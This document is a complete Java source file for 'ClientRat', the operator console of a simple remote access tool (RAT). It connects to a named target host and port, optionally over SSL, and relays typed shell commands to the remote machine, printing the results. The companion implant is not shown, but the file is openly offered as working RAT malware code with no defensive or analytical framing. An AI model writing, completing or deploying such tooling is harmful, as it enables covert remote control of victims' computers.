package simpleRat;

import org.apache.commons.cli.*;

import javax.net.ssl.SSLSocketFactory;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;

public class ClientRat {

    private static boolean quitFlag = false;
    private Socket clientSocket;
    private static String targetHost, targetPort;
    private static boolean encryptFlag;

    public ClientRat() {

    } //end of constructor

    public static void main(String[] args) {
        Options cmdLineOptions = new Options();
        Option target = new Option("t", "remote target", true, "target to attempt to connect to");
        target.setRequired(true);
        cmdLineOptions.addOption(target);
        Option port = new Option("p", "remote port", true, "target port to connect to");
        port.setRequired(true);
        cmdLineOptions.addOption(port);
        Option sslEncrypt = new Option("s", "encrypt", false, "use ssl encryption");
        sslEncrypt.setRequired(false);
        cmdLineOptions.addOption(sslEncrypt);

        CommandLineParser parser = new BasicParser();
        HelpFormatter formatter = new HelpFormatter();

        try {
            CommandLine cmd = parser.parse(cmdLineOptions, args);
            targetHost = cmd.getOptionValue("remote target");
            targetPort = cmd.getOptionValue("remote port");
            encryptFlag = cmd.hasOption('s');
        } catch (ParseException e) {
            formatter.printHelp("java -jar ClientRat.jar", cmdLineOptions);
            System.exit(1);
        }

        ClientRat clientRat = new ClientRat();

        if (encryptFlag) {
            clientRat.createEncryptedSocket(targetHost, Integer.parseInt(targetPort));
        } else {
            clientRat.createSocket(targetHost, Integer.parseInt(targetPort));
        }

        while (!quitFlag) {
            String command = clientRat.readCommand();
            clientRat.sendCommand(command);
            clientRat.recvCommandOutput();
        }

        clientRat.endSession();
    } //end of main()

    public void createSocket(String host, int port) {
        try {
            clientSocket = new Socket(host, port);
        } catch (IOException e) {
            System.out.println(e.toString());
            System.exit(-2);
        }
    } //end of createSocket()

    public void createEncryptedSocket(String host, int port) {
        try {
            SSLSocketFactory sslSocketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();
            clientSocket = sslSocketFactory.createSocket(host, port);
        } catch (IOException e) {
            System.out.println(e.toString());
            System.exit(-2);
        }
    } //end of createEncryptedSocket()

    public String readCommand() {
        Scanner commandScanner = new Scanner(System.in);
        System.out.print("simpleRat# ");
        String command = commandScanner.nextLine();

        if (command.equals("quit")) {
            quitFlag = true;
            System.out.println("Exiting!");
        }

        return command;
    } //end of readCommand()

    public void sendCommand(String clientCommand) {
        try {
            PrintWriter commandPrinter = new PrintWriter(clientSocket.getOutputStream(), true);
            commandPrinter.println(clientCommand);
            if (clientCommand.equals("quit")) {
                clientSocket.close();
                System.exit(0);
            }
        } catch (IOException e) {
            System.out.println(e.toString());
        }
    } //end of sendCommand()

    public void recvCommandOutput() {
        try {
            String commandOutput;
            BufferedReader commandOutputReader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));

            while (!(commandOutput = commandOutputReader.readLine()).equals("fin")) {
                System.out.println(commandOutput);
            }
        } catch (IOException e) {
            System.out.println(e.toString());
        }
    } //end of recvCommand()

    public void endSession() {
        try {
            clientSocket.close();
        } catch (IOException e) {
            System.out.println(e.toString());
        }
    } //end of endSession()
} //end of ClientRat
